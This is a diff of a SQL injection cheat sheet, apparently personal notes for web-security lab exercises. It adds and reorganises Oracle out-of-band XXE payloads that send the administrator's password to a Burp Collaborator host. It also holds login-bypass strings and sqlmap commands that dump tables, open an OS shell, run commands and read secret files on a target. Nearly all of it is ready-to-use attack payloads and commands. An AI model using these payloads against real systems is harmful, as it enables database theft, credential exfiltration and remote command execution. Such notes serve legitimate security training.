@@ -156,6 +156,9 @@ SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE roo
 SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(<OOB_URL_CONCAT_EXPRESSION>)||'.<COLLAB_DOMAIN>/"> %remote;]><root>&remote;</root>'),'/l') FROM dual;
 
 -- EXAMPLES
+
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+
 Cookie: TrackingId='union SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||'FOO.'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.<BURP-COLAB>/">+%25remote%3b]><root>%26remote%3b</root>'),'/l')+FROM+dual--%3b'; session=uusQnFTiIjfdetXz7v1zm2KKNYqU46MI'
 
 Cookie: TrackingId=a3j0nwT10l24RK9b'union+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(select password from users where username='administrator')||'.mlbzjigg5je1ct8leohiiwd5cwin6du2.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual -- -'
@@ -209,7 +212,7 @@ WHERE --> HAVING
 
 #### WAF-AUTH-BYPASS
 
-```bash
+```
 administrator' --
 administrator' #
 administrator'/*
@@ -288,11 +291,9 @@ or 1=1
 or 1=1--
 or 1=1#
 or 1=1/*
-
 ```
 
 #### SQL MAP
-
 ```bash
 ## MOST IMPORTANT PARAMS
 
@@ -301,7 +302,8 @@ or 1=1/*
 --cookie=
 --level=5
 --risk=3
---dbms=<DBM>
+--prefix=)"
+--dbms=<DBMS>
 --param-exclude='param1|param2|..'
 --batch
 --dump
@@ -311,30 +313,73 @@ or 1=1/*
 -D <DB>
 -T <TABLE>
 -C <COLUMN>
---sql-query="<QUERY>" 
---purgue
+--sql-query="<QUERY>"
+--purge
 --tor
 --os-cmd
 --file-read
+```
 
-# EXAMPLES
+---
+```bash
+## BASIC EXAMPLES
 
-sqlmap- --url=<URL> -cookie=<COOKIE> --level 5 --risk 3 -p <PARAM-VULN> --batch --threads 10 --dbms=<DB-TYPE> --sql-query="SELECT  password FROM <TABLE> where username=<USER>"
-sqlmap -r <REQUEST-FROM-BURP.txt> --level=5 --risk=3
+# From URL
+sqlmap --url=<URL> --cookie=<COOKIE> -p <PARAM> \
+  --level=5 --risk=3 --batch --threads=10 \
+  --dbms=<DBMS> \
+  --sql-query="SELECT password FROM <TABLE> WHERE username=<USER>"
+
+# From Burp request
+sqlmap -r <REQUEST.txt> --level=5 --risk=3
+
+# Dump specific table
 sqlmap -r req.txt --level=5 --risk=3 --dump -D public -T users 
 
+# OS Shell
 sqlmap -u "http://<IP>?search=test" \
   -p search \
   --cookie="<LOGGED-COOKIE>" \
   --level=3 --risk=2 \
   --random-agent \
-  --os-shell \
---dbms=
+  --dbms=<DBMS> \
+  --os-shell
+```
 
+---
+```bash
+## ENUMERATE & DUMP
 
+# 1. List databases
+sqlmap -u "https://target.com/page" \
+  --cookie="TrackingId=xyz*; session=abc" \
+  -p TrackingId \
+  --dbms=PostgreSQL \
+  --batch --threads=10 \
+  --dbs
 
+# 2. List tables  →  add to previous command
+--tables -D <DB>
 
-## READ SECRET
+# 3. Dump table  →  add to previous command
+--dump -T <TABLE> -D <DB> -C password
+```
+
+---
+```bash
+## CUSTOM SQL QUERY
+
+sqlmap -u "https://target.com/filter?category=Pets" \
+  -p category \
+  --dbms=PostgreSQL \
+  --level=5 --risk=3 \
+  --batch --threads=10 \
+  --sql-query="SELECT password FROM users WHERE username='administrator'"
+```
+
+---
+```bash
+## READ FILES / OS COMMANDS
 
 sqlmap -u "<IP>/?category=Pets" -p category --file-read "/home/carlos/secret" -v 1
 sqlmap -u "<IP>/?category=Pets" -p category --os-cmd "cat /home/carlos/secret" -v 1
